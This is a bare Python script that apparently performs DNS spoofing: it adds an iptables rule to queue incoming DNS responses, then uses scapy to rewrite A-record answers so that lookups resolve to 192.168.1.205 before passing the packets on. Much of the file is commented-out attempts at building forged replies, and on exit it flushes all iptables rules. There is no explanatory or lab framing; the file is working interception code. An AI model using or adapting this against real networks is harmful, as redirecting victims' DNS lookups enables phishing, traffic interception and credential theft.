from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

def callback(packet):
    redirect_to = '192.168.1.205'

    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string
    if (pkt.haslayer(DNSRR) and (pkt[DNSRR][0].rdata != redirect_to) and (pkt[DNSQR][0].qtype == 1)): # DNS question record


        pkt.show()
        print('----------------------------------------------')

        pkt[DNSRR][0].rdata = redirect_to

        # Recalculation checksum and length 
        pkt[UDP].chksum = in4_chksum(socket.IPPROTO_UDP, pkt[UDP], raw(pkt[UDP]))
        pkt[UDP].len = len(raw(pkt[UDP]))
        
        pkt[IP].chksum = in4_chksum(socket.IPPROTO_IP, pkt[IP], raw(pkt[IP]))
        pkt[IP].len = len(raw(pkt[IP]))

        # print('----------------------------------------------')
        pkt.show()
        # print(pkt[DNSRR])

        # Help on function in4_chksum in module scapy.layers.inet:

        # in4_chksum(proto, u, p)
        #     As Specified in RFC 2460 - 8.1 Upper-Layer Checksums
            
        #     Performs IPv4 Upper Layer checksum computation. Provided parameters are:
        #     - 'proto' : value of upper layer protocol
        #     - 'u'  : IP upper layer instance
        #     - 'p'  : the payload of the upper layer provided as a string


        # print (pkt)
        # pkt[IP].dst = '3.1.33.7'
        # pkt[IP].len = len(str(pkt))
        # pkt[UDP].len = len(str(pkt[UDP]))
        # del pkt[IP].chksum

   #      spoofed_pkt =	Ether(pkt[Ether])/\
			# IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
			# UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/\
			# DNS(pkt[DNS])
	                              # DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
	                              # an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_to))
   #      spoofed_pkt =	Ether(pkt[Ether])/\
			# IP(pkt[IP])/\
   #                  	UDP(pkt[UDP])/\
			# DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
			# an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
       #  spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
	      # UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
	      # DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1,\
       #        an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))

        # spoofed_pkt[DNSRR].rdata = '1.1.1.1'
        # print('----------------------------------------------')
        # del pkt[Ether]
        # pkt[Ether] = 0
        # sendp(pkt, iface='wlp2s0')
        # print('----------------------------------------------')
        # spoofed_pkt.show()
        
        packet.set_payload(str(pkt)) #set the packet content to our modified version

        packet.accept() #accept the packet
        # sendp(spoofed_pkt, iface='wlp2s0')
        print ('Sent:', pkt.summary())
        # exit()
        # raise Exception("Done")

def main ():
	os.system("iptables -A INPUT -p udp --sport 53 -j NFQUEUE --queue-num 8")
	nfqueue = NetfilterQueue()
	nfqueue.bind(8, callback)

	try:
		nfqueue.run() 
	except:
	    os.system('iptables -F')
	    os.system('iptables -X')

main()